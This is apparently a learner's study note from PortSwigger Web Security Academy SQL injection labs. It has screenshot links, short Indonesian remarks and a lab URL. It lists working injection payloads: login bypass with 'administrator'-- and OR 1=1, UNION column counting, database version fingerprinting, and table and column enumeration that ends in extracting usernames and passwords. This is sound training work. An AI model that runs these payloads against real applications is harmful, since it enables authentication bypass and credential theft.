![[Pasted image 20250314145642.png]]
' OR '1'='1' AND released=0 --

![[Pasted image 20250314145521.png]]
```
administrator'--
```

##### Practicioner
![[Pasted image 20250314145702.png]]


![[Pasted image 20250319190119.png]]
' UNION SELECT @@version, NULL# -> NEMU HASIL




```
' UNION SELECT 'abc' FROM dual-- -> MASI ERROR
' UNION SELECT 'abc','def' FROM dual-- -> NEMU DATA

' UNION SELECT BANNER, NULL FROM v$version-- -> NEMU HASIL 

' UNION SELECT @@version, NULL# -> NEMU HASIL



' UNION SELECT 'abc','def' FROM dual--
' UNION SELECT table_name, NULL FROM all_tables--

' UNION SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_TRUTUY'--

' UNION SELECT USERNAME_SZAZZF, PASSWORD_OFHSQU FROM USERS_TRUTUY--



UNSOLVED : ==> ' UNION SELECT * FROM information_schema.tables --


https://0a250009048f549984b10fe700550066.web-security-academy.net/filter?category=' UNION SELECT BANNER, NULL FROM v$version--
```

```sql
`--

`OR 1=1--

' UNION SELECT my_col, my_col2 FROM table--


' UNION SELECT NULL; --
-> get UNION SELECT NULL, NULL, NULL until wrong -> maksimal number of column reached


-> Fuzz Data Type
' UNION SELECT 'abc',123; --

' UNION SELECT my_col, my_col2 FROM table--


```
